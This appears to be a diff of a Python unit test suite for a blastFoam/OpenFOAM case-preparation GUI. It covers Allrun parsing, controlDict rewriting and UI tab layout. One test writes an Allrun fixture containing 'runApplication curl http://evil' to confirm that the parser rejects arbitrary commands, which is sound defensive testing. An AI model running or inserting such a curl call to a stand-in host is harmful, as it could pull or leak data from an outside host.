@@ -134,18 +134,23 @@ class AllrunSequenceTests(unittest.TestCase):
         with tempfile.TemporaryDirectory() as td:
             root = _make_unmeshed_source(Path(td))
             seq = parse_allrun_preprocess_sequence(str(root))
-            self.assertEqual(seq, ("blockMesh", "setRefinedFields"))
+            self.assertEqual(tuple(c.utility for c in seq), ("blockMesh", "setRefinedFields"))
             cmds = preparation_commands_for_case(str(root))
-            self.assertEqual(cmds, ("blockMesh", "setRefinedFields", "checkMesh"))
+            self.assertEqual(
+                tuple(c.display() for c in cmds),
+                ("blockMesh", "setRefinedFields", "checkMesh"),
+            )
 
     def test_arbitrary_allrun_commands_never_executed(self):
+        from allrun_commands import AllrunParseError
+
         with tempfile.TemporaryDirectory() as td:
             root = Path(td)
             _write(
                 root / "Allrun",
                 "#!/bin/sh\nrunApplication blockMesh\nrunApplication curl http://evil\n",
             )
-            with self.assertRaises(ValueError):
+            with self.assertRaises(AllrunParseError):
                 parse_allrun_preprocess_sequence(str(root))
 
 
@@ -278,6 +283,96 @@ class MappingTests(unittest.TestCase):
             self.assertIn("endTime", result.changed)
             self.assertEqual(float(result.readback["endTime"]), 1e-6)
 
+    def test_control_dict_writer_updates_root_only_not_nested_function_objects(self):
+        with tempfile.TemporaryDirectory() as td:
+            source = _make_unmeshed_source(Path(td) / "src")
+            control_path = source / "system" / "controlDict"
+            original = control_path.read_text(encoding="utf-8")
+            control_path.write_text(
+                original
+                + """
+functions
+{
+    impulse
+    {
+        writeControl timeStep;
+        writeInterval 1;
+        nested
+        {
+            writeControl timeStep;
+            writeInterval 1;
+        }
+    }
+}
+""",
+                encoding="utf-8",
+            )
+            result = write_control_dict_entries(
+                str(source),
+                {
+                    "writeControl": "adjustableRunTime",
+                    "writeInterval": 0.001,
+                },
+            )
+            self.assertTrue(result.ok, result.reason)
+            updated = control_path.read_text(encoding="utf-8")
+            self.assertIn("writeControl adjustableRunTime;", updated)
+            self.assertIn("writeInterval 0.001;", updated)
+            self.assertEqual(updated.count("writeControl timeStep;"), 2)
+            self.assertEqual(updated.count("writeInterval 1;"), 2)
+
+    def test_native_2d_and_3d_prerun_updates_preserve_nested_integer_intervals(self):
+        nested = """
+functions
+{
+    impulse
+    {
+        writeControl timeStep;
+        writeInterval 1;
+    }
+    overpressure
+    {
+        writeControl timeStep;
+        writeInterval 1;
+    }
+    dynamicPressure
+    {
+        writeControl timeStep;
+        writeInterval 1;
+    }
+    probes
+    {
+        writeControl timeStep;
+        writeInterval 1;
+    }
+}
+"""
+        scenarios = (
+            ("2D-time", "adjustableRunTime", 0.001),
+            ("2D-step", "timeStep", 25),
+            ("3D-time", "adjustableRunTime", 0.001),
+            ("3D-step", "timeStep", 25),
+        )
+        for label, write_control, interval in scenarios:
+            with self.subTest(label=label), tempfile.TemporaryDirectory() as td:
+                case = Path(td)
+                control_path = case / "system" / "controlDict"
+                _write(
+                    control_path,
+                    "endTime 0.01;\n"
+                    "writeControl timeStep;\n"
+                    "writeInterval 10;\n"
+                    + nested,
+                )
+                BlastFoamApp._update_control_dict_end_time(
+                    object(), str(case), 0.02, interval, write_control
+                )
+                updated = control_path.read_text(encoding="utf-8")
+                self.assertIn(f"writeControl {write_control};", updated)
+                self.assertIn(f"writeInterval {interval};", updated)
+                self.assertEqual(updated.count("writeControl timeStep;"), 4 + (write_control == "timeStep"))
+                self.assertEqual(updated.count("writeInterval 1;"), 4)
+
     def test_unsupported_control_keys_rejected(self):
         with tempfile.TemporaryDirectory() as td:
             source = _make_unmeshed_source(Path(td) / "src")
@@ -295,7 +390,12 @@ class MappingTests(unittest.TestCase):
 
 
 class PrepareWorkflowTests(unittest.TestCase):
-    def _runner_ok(self, case_dir, utility):
+    @staticmethod
+    def _utility_name(command):
+        return getattr(command, "utility", str(command))
+
+    def _runner_ok(self, case_dir, command):
+        utility = self._utility_name(command)
         if utility == "blockMesh":
             mesh = Path(case_dir) / "constant" / "polyMesh"
             for name in ("points", "faces", "owner", "neighbour", "boundary"):
@@ -333,9 +433,9 @@ class PrepareWorkflowTests(unittest.TestCase):
             create_working_copy(str(source), str(dest), str(REPO))
             seen = []
 
-            def runner(case_dir, utility):
-                seen.append((os.path.normpath(case_dir), utility))
-                return self._runner_ok(case_dir, utility)
+            def runner(case_dir, command):
+                seen.append((os.path.normpath(case_dir), self._utility_name(command)))
+                return self._runner_ok(case_dir, command)
 
             result = prepare_working_copy(str(dest), str(source), runner)
             self.assertTrue(result.ok)
@@ -355,7 +455,8 @@ class PrepareWorkflowTests(unittest.TestCase):
             create_working_copy(str(source), str(dest), str(REPO))
             seen = []
 
-            def runner(case_dir, utility):
+            def runner(case_dir, command):
+                utility = self._utility_name(command)
                 seen.append(utility)
                 if utility == "blockMesh":
                     return 1, "FAILED"
@@ -393,6 +494,7 @@ class ImportedUiTests(unittest.TestCase):
         for p in cls._patches:
             p.start()
         cls.win = BlastFoamApp()
+        cls.win._force_sync_prep = True
 
     @classmethod
     def tearDownClass(cls):
@@ -426,10 +528,16 @@ class ImportedUiTests(unittest.TestCase):
                              isinstance(getattr(self.win.tab_2d, "_left_stack", None), QStackedWidget)
                              and self.win.tab_2d._left_stack.currentIndex() == 1)
             self.assertFalse(hasattr(self.win.tab_2d, "txt_external_summary"))
-            self.assertEqual(self.win.tab_2d.input_tabs.count(), 3)
             self.assertEqual(self.win.tab_2d.input_tabs.tabText(0), "Setup")
-            self.assertEqual(self.win.tab_2d.input_tabs.tabText(1), "Mesh & AMR")
-            self.assertEqual(self.win.tab_2d.input_tabs.tabText(2), "Output & Probes")
+            self.assertTrue(self.win.tab_2d.input_tabs.tabBar().isHidden())
+            self.assertIsNotNone(self.win.tab_2d.tbl_probes)
+            if hasattr(self.win.tab_2d.input_tabs, "isTabVisible"):
+                self.assertEqual(self.win.tab_2d.input_tabs.count(), 2)
+                self.assertEqual(self.win.tab_2d.input_tabs.tabText(1), "Output & Probes")
+                self.assertFalse(self.win.tab_2d.input_tabs.isTabVisible(1))
+            else:
+                self.assertEqual(self.win.tab_2d.input_tabs.count(), 1)
+            self.assertEqual(self.win.tab_2d.btn_mesh_amr.text(), "Mesh & AMR")
             self.assertTrue(self.win.tab_2d.lbl_import_banner.text())
             self.assertIn("Editable GGUI model", self.win.tab_2d.lbl_import_banner.text())
             # Banner is shown when a case is loaded (may not be visible offscreen).
